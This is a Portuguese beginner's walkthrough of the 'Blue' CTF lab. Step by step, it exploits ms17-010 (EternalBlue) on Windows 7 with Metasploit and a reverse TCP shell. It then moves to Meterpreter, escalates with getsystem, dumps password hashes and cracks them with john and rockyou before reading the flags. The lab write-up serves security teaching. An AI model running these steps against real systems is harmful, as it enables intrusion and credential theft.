# Observações
- Sejam éticos!
- CTFs não são diretos ao ponto, é recorrente precisar ir e voltar em vários passos até conseguir obter a flag e finalizar. Lendo/vendo o material pode parecer que está tudo acontecendo rápido, isso só é possível com preparação prévia e algum tempo e esforço.
- É natural esbarrar em coisas que você não sabe durante o processo, parte do trabalho de um hacker é pesquisar como invadir um sistema a partir das informações que ele têm
- Estamos usando ferramentas para abstrair parte do processo e tornar mais fácil pra quem está iniciando na cibersegurança, mas é importante não depender delas e de fato entender o processo por trás
# Contexto geral do CTF:
- O Blue simula uma máquina utilizando Windows 7 com um clássico erro de configuração, vamos tentar explorar o computador nos aproveitando desse descuido.
# Reconhecimento
- Primeiro ligamos a VPN
```bash
sudo openvpn OracleofDelfos.ovpn
```
- Começamos com um scan do nmap
```bash 
nmap -sV -p0-1000 <IP>
``` 
- -p especifica quais portas serão escaneadas e -sV especifica para tentar encontrar o serviço ativo nessa porta
Resultado:
```bash
PORT    STATE SERVICE      VERSION
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
```
- Dentre essas portas, a 445 é familiar por sua recorrência em CTFs, ela está relacionada com o protocolo SMB, que hoje em dia não é mais usado por não ser considerado seguro
- De qualquer forma, como mencionado acima, o conhecimento prévio é útil mas não obrigatório, então basta pesquisar sobre cada uma na internet
	- Encontramos ms17-010, forma de identificar uma vulnerabilidade, o modelo mais comum é o CVE mas como o Metasploit já classificou, provavelmente podemos explorar esse CTF usando ele.
- Nessa etapa conseguimos identificar o que é chamado de um **vetor de ataque** , uma forma de talvez acessar o computador do alvo.
# Acesso
- Começar iniciando o Metasploit
```bash
msfconsole
```
- Procurar o exploit para a vulnerabilidade especifica:
```bash
search ms17-010
```
- Várias opções, mas a primeira que encontramos no google foi relacionado ao Eternal-Blue, então vamos nesse
```bash
use 0
show options
```
- Aqui várias configurações já vem prontas, basta selecionar o RHOST, que é o IP que vamos atacar e o LHOST, seu próprio IP dentro da VPN,  pode ser obtido abrindo 10.10.10.10 no navegador.
```bash
set RHOSTS <IP>
set LHOST <Seu IP>
```
- Normalmente, isso seria o suficiente, mas a room pede para especificarmos um payload mais simples para fazermos a escalação de privilégio num passo separado, por questões didáticas, então fazemos:
```bash
set payload windows/x64/shell/reverse_tcp
```
- Por fim, basta iniciar o ataque!
```bash
run
```
- Com isso conseguimos uma shell dentro da máquina!
```bash
C:\Windows\system32>
```
- Nesse momento, já obtivemos acesso direto ao sistema do alvo, um atacante malicioso poderia causar muitos prejuízos com esse grau de acesso mas, se possível, queremos obter acesso de administrador para garantir controle total da máquina-alvo.
# Escalação de privilégio
- Temos acesso à uma shell normal, esse passo consiste em obter acesso de administrador e, portanto, acesso total à máquina
- Vamos colocar essa shell de agora para rodar em segundo plano e voltar pro metasploit, para isso usamos Ctrl+Z
- O Metasploit tem um script que serve como shell de administrador chamada Meterpreter, queremos trocar da shell comum para essa, para isso pesquisamos um modulo que faça isso, literalmente
```bash
search shell_to_meterpreter
use 0
```
  - Olhando novamente as opções, falta apenas o LHOST e a sessão já aberta, vamos resolver isso
```bash
show options
set LHOST <Seu IP>
sessions -l 
set SESSION 1
```
- Uma vez que o módulo execute corretamente, vamos mudar a sessão de volta e conferir se temos acesso de administrador
```bash 
sessions -i 2
getsystem
```
- Com isso, temos uma shell de administrador, mas não significa que o processo onde o arquivo malicioso se encontra está, para isso vamos migrar o processo
```bash
ps
migrate <número>
```
- Agora que temos acesso de administrador ao sistema, vamos começar garantindo acesso para outras sessões se necessário, obtendo a senha do windows do alvo.
# Quebra de senhas
- Vamos obter as hashs das senhas a partir do acesso de administrador obtido
```bash
hashdump
```
- Com isso, vamos encontrar a senha do Jon usando a wordlist rockyou.txt
	- Em geral, compensa pesquisar hashes no google, muitas vezes elas já foram quebradas economiza trabalho, tempo e processamento, no entanto, também por motivos didáticos vamos quebrar ela manualmente
```bash
nano hash.txt
cp /usr/share/wordlists/rockyou.txt.gz .
sudo gunzip -c rockyou.txt.gz > rockyou.txt    
john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```
- Resultado:
```bash
alqfna22         (Jon)    
```
# Pós-Exploração e Flags
- Agora já temos acesso total ao sistema, só faltam encontrar as flags
- Primeiro lugar que é interessante é acessível só para admins, o root do sistema
- Navegamos até lá usando cd .. repetidamente
```bash
ls
cat flag1.txt
```
Resultado:
```bash
flag{access_the_machine}
```
- Próximo lugar que pode interessar é o System32, lá onde vários arquivos de sistema ficam guardados, isso inclui as senhas em System32/config
```bash
ls
cat flag2.txt
```
Resultado:
```bash
flag{sam_database_elevated_access}
```
- À essa altura, já vasculhamos tudo que era interessante do computador do Jon, nosso alvo hipotético
	- Agora do ponto de vista humano, onde pode ter alguma coisa de interessante?
		- Como ele é o admin, muito provavelmente ele vai ter algum documento importante certo? Muitos dados pessoais dele podem ser expostos a partir daqui
		- Com isso em mente, vasculhamos a pasta Documents do Jon
```bash
ls
cat flag3.txt
```
Resultado:
```bash
flag{admin_documents_can_be_valuable}
```

Fim do CTF!!
